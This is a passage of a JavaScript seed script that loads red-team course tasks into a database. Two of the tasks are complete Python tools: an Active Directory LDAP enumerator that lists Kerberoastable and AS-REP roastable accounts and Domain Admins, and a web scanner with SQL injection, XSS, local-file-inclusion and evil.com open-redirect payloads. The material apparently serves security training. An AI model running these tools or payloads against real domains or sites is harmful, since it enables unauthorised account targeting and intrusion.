Uses LDAP to enumerate AD objects
"""

import argparse
import ldap3
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
import json
from datetime import datetime
import sys

class ADEnumerator:
    def __init__(self, dc_ip, domain, username, password):
        self.dc_ip = dc_ip
        self.domain = domain
        self.username = username
        self.password = password
        self.connection = None
        self.base_dn = self._get_base_dn()

    def _get_base_dn(self):
        """Convert domain to base DN"""
        return ','.join([f'DC={part}' for part in self.domain.split('.')])

    def connect(self):
        """Connect to DC via LDAP"""
        server = Server(self.dc_ip, get_info=ALL)

        # Format: DOMAIN\\username
        user = f"{self.domain}\\\\{self.username}"

        self.connection = Connection(
            server,
            user=user,
            password=self.password,
            authentication=NTLM
        )

        if not self.connection.bind():
            raise Exception(f"LDAP bind failed: {self.connection.last_error}")

        print(f"[+] Connected to {self.dc_ip}")
        return True

    def search(self, search_filter, attributes):
        """Execute LDAP search"""
        self.connection.search(
            self.base_dn,
            search_filter,
            search_scope=SUBTREE,
            attributes=attributes
        )
        return self.connection.entries

    def get_users(self):
        """Get all domain users"""
        print("[*] Enumerating users...")
        entries = self.search(
            '(&(objectClass=user)(objectCategory=person))',
            ['sAMAccountName', 'displayName', 'mail', 'memberOf',
             'userAccountControl', 'lastLogon', 'pwdLastSet',
             'servicePrincipalName', 'adminCount']
        )

        users = []
        for entry in entries:
            user = {
                'username': str(entry.sAMAccountName),
                'displayName': str(entry.displayName) if entry.displayName else '',
                'email': str(entry.mail) if entry.mail else '',
                'groups': [str(g) for g in entry.memberOf] if entry.memberOf else [],
                'spn': [str(s) for s in entry.servicePrincipalName] if entry.servicePrincipalName else [],
                'adminCount': str(entry.adminCount) if entry.adminCount else '0',
                'uac': str(entry.userAccountControl)
            }
            users.append(user)

        return users

    def get_computers(self):
        """Get all domain computers"""
        print("[*] Enumerating computers...")
        entries = self.search(
            '(objectClass=computer)',
            ['name', 'operatingSystem', 'operatingSystemVersion',
             'dNSHostName', 'userAccountControl']
        )

        computers = []
        for entry in entries:
            computer = {
                'name': str(entry.name),
                'os': str(entry.operatingSystem) if entry.operatingSystem else '',
                'osVersion': str(entry.operatingSystemVersion) if entry.operatingSystemVersion else '',
                'dns': str(entry.dNSHostName) if entry.dNSHostName else ''
            }
            computers.append(computer)

        return computers

    def get_groups(self):
        """Get all groups"""
        print("[*] Enumerating groups...")
        entries = self.search(
            '(objectClass=group)',
            ['name', 'member', 'description', 'adminCount']
        )

        groups = []
        for entry in entries:
            group = {
                'name': str(entry.name),
                'members': len(entry.member) if entry.member else 0,
                'description': str(entry.description) if entry.description else '',
                'adminCount': str(entry.adminCount) if entry.adminCount else '0'
            }
            groups.append(group)

        return groups

    def get_kerberoastable(self):
        """Find Kerberoastable accounts"""
        print("[*] Finding Kerberoastable users...")
        entries = self.search(
            '(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
            ['sAMAccountName', 'servicePrincipalName', 'memberOf']
        )

        kerberoastable = []
        for entry in entries:
            user = {
                'username': str(entry.sAMAccountName),
                'spn': [str(s) for s in entry.servicePrincipalName],
                'groups': [str(g) for g in entry.memberOf] if entry.memberOf else []
            }
            kerberoastable.append(user)

        return kerberoastable

    def get_asrep_roastable(self):
        """Find AS-REP roastable accounts"""
        print("[*] Finding AS-REP roastable users...")
        # UAC flag: DONT_REQUIRE_PREAUTH = 0x400000 (4194304)
        entries = self.search(
            '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
            ['sAMAccountName', 'memberOf']
        )

        asrep = []
        for entry in entries:
            user = {
                'username': str(entry.sAMAccountName),
                'groups': [str(g) for g in entry.memberOf] if entry.memberOf else []
            }
            asrep.append(user)

        return asrep

    def get_domain_admins(self):
        """Get Domain Admins members"""
        print("[*] Enumerating Domain Admins...")
        entries = self.search(
            '(&(objectClass=group)(cn=Domain Admins))',
            ['member']
        )

        if entries:
            return [str(m) for m in entries[0].member] if entries[0].member else []
        return []

    def full_enum(self):
        """Run full enumeration"""
        results = {
            'timestamp': datetime.now().isoformat(),
            'domain': self.domain,
            'dc': self.dc_ip,
            'users': self.get_users(),
            'computers': self.get_computers(),
            'groups': self.get_groups(),
            'kerberoastable': self.get_kerberoastable(),
            'asrep_roastable': self.get_asrep_roastable(),
            'domain_admins': self.get_domain_admins()
        }

        return results


def main():
    parser = argparse.ArgumentParser(description='AD Enumerator')
    parser.add_argument('-d', '--domain', required=True, help='Domain name')
    parser.add_argument('-u', '--username', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('-dc', '--dc-ip', required=True, help='Domain Controller IP')
    parser.add_argument('-o', '--output', help='Output JSON file')
    args = parser.parse_args()

    print("""
    ╔═══════════════════════════════════════╗
    ║       AD Enumerator                   ║
    ╚═══════════════════════════════════════╝
    """)

    enum = ADEnumerator(args.dc_ip, args.domain, args.username, args.password)

    try:
        enum.connect()
        results = enum.full_enum()

        print(f"\\n=== Summary ===")
        print(f"Users: {len(results['users'])}")
        print(f"Computers: {len(results['computers'])}")
        print(f"Groups: {len(results['groups'])}")
        print(f"Kerberoastable: {len(results['kerberoastable'])}")
        print(f"AS-REP Roastable: {len(results['asrep_roastable'])}")
        print(f"Domain Admins: {len(results['domain_admins'])}")

        if args.output:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"\\n[+] Results saved to {args.output}")

    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
python3 ad_enum.py -d lab.local -u user -p 'Password123' -dc 10.0.0.10 -o results.json
\`\`\``, 0, now);

insertTask.run(pyMod1.lastInsertRowid, 'Create Web Vulnerability Scanner', 'Build an automated scanner that crawls web applications and tests for OWASP Top 10 vulnerabilities including SQL injection, XSS, SSRF, and path traversal using payload fuzzing and response analysis', `## Python Web Vulnerability Scanner

### Implementation
\`\`\`python
#!/usr/bin/env python3
"""
web_vuln_scanner.py - Web Vulnerability Scanner
Checks for common web vulnerabilities
"""

import argparse
import requests
from urllib.parse import urljoin, urlparse, parse_qs
import re
from concurrent.futures import ThreadPoolExecutor
import warnings

warnings.filterwarnings('ignore')

class WebScanner:
    def __init__(self, target, threads=10, timeout=10):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0'
        })
        self.findings = []

    def add_finding(self, vuln_type, url, detail, severity='Medium'):
        self.findings.append({
            'type': vuln_type,
            'url': url,
            'detail': detail,
            'severity': severity
        })
        print(f"[!] {severity}: {vuln_type}")
        print(f"    URL: {url}")
        print(f"    Detail: {detail}\\n")

    def test_sqli(self, url, params):
        """Test for SQL Injection"""
        payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "1' ORDER BY 1--",
            "1 UNION SELECT NULL--",
        ]

        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"PostgreSQL.*ERROR",
            r"ORA-[0-9]+",
            r"Microsoft SQL Server",
            r"SQLite.*error",
            r"syntax error",
        ]

        for param in params:
            original = params[param]
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = original + payload

                try:
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)

                    for pattern in error_patterns:
                        if re.search(pattern, resp.text, re.I):
                            self.add_finding(
                                'SQL Injection',
                                url,
                                f'Parameter: {param}, Payload: {payload}',
                                'Critical'
                            )
                            return True
                except:
                    pass
        return False

    def test_xss(self, url, params):
        """Test for Cross-Site Scripting"""
        payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
        ]

        for param in params:
            original = params[param]
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload

                try:
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)

                    if payload in resp.text:
                        self.add_finding(
                            'Cross-Site Scripting (XSS)',
                            url,
                            f'Parameter: {param}, Payload reflected',
                            'High'
                        )
                        return True
                except:
                    pass
        return False

    def test_lfi(self, url, params):
        """Test for Local File Inclusion"""
        payloads = [
            '../../../../etc/passwd',
            '..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
            '....//....//....//....//etc/passwd',
            '/etc/passwd%00',
        ]

        indicators = [
            'root:x:0:0',
            '[fonts]',
            'localhost',
        ]

        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload

                try:
                    resp = self.session.get(url, params=test_params, timeout=self.timeout)

                    for indicator in indicators:
                        if indicator in resp.text:
                            self.add_finding(
                                'Local File Inclusion (LFI)',
                                url,
                                f'Parameter: {param}, Payload: {payload}',
                                'Critical'
                            )
                            return True
                except:
                    pass
        return False

    def test_open_redirect(self, url, params):
        """Test for Open Redirect"""
        evil_urls = [
            'https://evil.com',
            '//evil.com',
            'https:evil.com',
        ]

        redirect_params = ['url', 'redirect', 'next', 'return', 'goto', 'target']

        for param in params:
            if param.lower() in redirect_params:
                for evil in evil_urls:
                    test_params = params.copy()
                    test_params[param] = evil

                    try:
                        resp = self.session.get(
                            url, params=test_params,
                            timeout=self.timeout,
                            allow_redirects=False
                        )

                        if resp.status_code in [301, 302, 303, 307, 308]:
                            location = resp.headers.get('Location', '')
                            if 'evil.com' in location:
                                self.add_finding(
                                    'Open Redirect',
                                    url,
                                    f'Parameter: {param}, Redirects to external URL',
                                    'Medium'
                                )
                                return True
                    except:
                        pass
        return False

    def check_security_headers(self, url):
        """Check for missing security headers"""
        try:
            resp = self.session.get(url, timeout=self.timeout)
            headers = resp.headers

            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'X-XSS-Protection': '1',
                'Content-Security-Policy': None,
                'Strict-Transport-Security': None,
            }

            for header, expected in security_headers.items():
                if header not in headers:
                    self.add_finding(
                        'Missing Security Header',
                        url,
                        f'Header: {header}',
                        'Low'
                    )
        except:
            pass

    def scan_url(self, url):
        """Scan a single URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if params:
            # Flatten params
            flat_params = {k: v[0] for k, v in params.items()}
            base_url = url.split('?')[0]

            self.test_sqli(base_url, flat_params)
            self.test_xss(base_url, flat_params)
            self.test_lfi(base_url, flat_params)
            self.test_open_redirect(base_url, flat_params)

    def scan(self):
        """Run full scan"""
        print(f"[*] Scanning: {self.target}\\n")

        # Check security headers
        self.check_security_headers(self.target)

        # Scan main URL
        self.scan_url(self.target)

        print(f"\\n=== Scan Complete ===")
        print(f"Total findings: {len(self.findings)}")

        return self.findings


def main():
    parser = argparse.ArgumentParser(description='Web Vulnerability Scanner')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=10)
    parser.add_argument('-o', '--output', help='Output file')
    args = parser.parse_args()

    scanner = WebScanner(args.url, args.threads)
    findings = scanner.scan()

    if args.output:
        import json
        with open(args.output, 'w') as f:
            json.dump(findings, f, indent=2)
        print(f"[+] Results saved to {args.output}")


if __name__ == '__main__':
    main()
\`\`\``, 1, now);

console.log('Seeded: Multi-Language Red Team Tooling');
console.log('  - C/C++ Fundamentals (4 tasks)');
console.log('  - C# & .NET (3 tasks)');
console.log('  - Rust (2 tasks)');
console.log('  - Go (2 tasks)');
console.log('  - Python (2 tasks)');

sqlite.close();
